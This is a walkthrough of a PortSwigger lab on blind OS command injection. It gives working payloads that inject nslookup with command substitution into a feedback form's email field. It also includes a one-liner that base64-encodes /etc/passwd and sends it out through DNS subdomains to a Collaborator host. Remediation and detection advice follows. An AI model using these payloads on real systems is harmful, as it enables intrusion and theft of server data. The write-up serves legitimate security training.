# Lab 5: Blind OS command injection with out-of-band data exfiltration

**Category:** OS Command Injection
**Difficulty:** Practitioner
**Lab link:** [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

## Overview

Same injection point as Labs 2-4 (feedback form, `email`, blind). Lab 4 confirmed execution via a Collaborator DNS lookup; this lab exfiltrates the actual output of `whoami` by embedding it as a subdomain of the Collaborator domain. Collaborator logs the full query — attacker reads the username from the subdomain and submits it to solve.

## Key Concepts

- **Backtick command substitution** (`` `cmd` ``) or `$(cmd)`: shell runs the inner command first, uses its output as part of the outer command.
- **DNS subdomain as exfil channel:** any string becomes a subdomain. Collaborator records the full queried domain, including the dynamic subdomain containing exfiltrated data.
- **DNS label limits:** 63 chars per label, 253 chars total. Characters restricted to `[a-zA-Z0-9-]`. Base64/hex-encode larger outputs; split long data across multiple queries.
- **Lab 4 vs Lab 5:** Lab 4 proves execution (DNS lookup fires); Lab 5 proves execution **and** exfiltrates content.

## Burp Setup

- Proxy → intercept feedback-submit, send to Repeater.
- Open **Collaborator** tab.

## Solution

### Step 1 — Inject with backtick-wrapped whoami

```
POST /feedback/submit HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<csrf>&name=x&email=||nslookup `whoami`.YOUR-COLLAB-ID.oastify.com||&subject=x&message=x
```

If backticks get stripped by Burp's encoding, use `$(whoami)` instead.

### Step 2 — Poll Collaborator

Collaborator tab → **Poll now**. DNS interaction appears. Click the row → **Description** tab. Full queried domain:
```
peter-xxxxxx.abc123.oastify.com
```

### Step 3 — Submit the username

Copy `peter-xxxxxx` (the subdomain before your Collaborator ID). Paste into the lab's **Submit solution** form (top of lab page). Lab solved.

## How It Works

1. Feedback endpoint concatenates `email` into shell command.
2. Real email command fails on `||...` → `||` fallthrough.
3. Shell parses `` nslookup `whoami`.<collab>.oastify.com ``.
4. **Backtick substitution:** shell runs `whoami` first, gets `peter-xxxxxx`, substitutes into the outer command.
5. Final command executed: `nslookup peter-xxxxxx.abc123.oastify.com`.
6. Server's resolver queries DNS → lookup reaches Collaborator.
7. Collaborator logs the query with the full subdomain.
8. Attacker reads `peter-xxxxxx` from the log.

## Why Backticks (or `$()`)

Both are POSIX shell syntax for **command substitution** — run the inner command, substitute its stdout into the outer command. Backticks are older; `$()` is more modern and allows nesting.

Preference: `$()` unless the input URL-encoder strips `$` or `(`. Both work in bash, zsh, sh, ash, dash.

## Why DNS as the Exfil Channel

- Firewalls rarely block outbound DNS.
- Collaborator logs the full queried domain including dynamic subdomain.
- DNS is faster than HTTP for OAST — single UDP round-trip vs TCP handshake + response.
- Fits structured data as a subdomain prefix — up to ~63 chars per label, which is enough for most usernames, hostnames, hashes.

## DNS-Safe Encoding for Larger Output

Characters outside `[a-zA-Z0-9-]` break DNS queries. For complex output:
```bash
nslookup $(cat /etc/passwd | base64 | tr -d '=' | head -c 50).<collab>.oastify.com
```
- `base64` → safe characters (though `+/=` need stripping).
- `tr -d '='` → remove padding.
- `head -c 50` → fit within label length limit.

For data larger than 50 chars, split across multiple queries using `cut -c N-M` and send multiple nslookups.

## Why It Worked

- Feedback endpoint concatenates `email` into shell command without escaping.
- `||` fallthrough triggers payload.
- Shell substitution evaluates `whoami` into the DNS name.
- Server resolver sends DNS, Collaborator logs query.
- Attacker reads subdomain → extracts command output.

## Remediation

- **Exec-with-argv, not shell concatenation.**
- **Egress filtering** — block outbound DNS from web processes except to known infrastructure.
- **DNS monitoring** — alert on queries with high-entropy subdomains (indicates exfiltration).
- **Monitor unusual child processes** (nslookup, dig, host) from web user.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/os-command-injection/lab-05-blind-oast-exfiltration/solve.py)

Sends the payload with user-provided Collaborator subdomain. User confirms the exfiltrated data in Collaborator UI and submits via lab solution form.

## Key Takeaways

- **Backtick / `$()` command substitution** is the primitive that turns OAST from "confirm execution" into "exfil data."
- **Any command output fits in a DNS subdomain** (up to 63 chars per label). Base64 for anything with special characters.
- **Lab 4 vs 5:** execution confirmation vs data exfiltration. Same technique, different payload composition.
- **Full blind RCE kill-chain:** Lab 1 (in-band) → Lab 2 (timing) → Lab 3 (file write) → Lab 4 (OAST confirm) → Lab 5 (OAST exfil).
- **Detection side:** high-entropy subdomains in outbound DNS are a strong IOC for data-exfil-via-DNS tunnels.
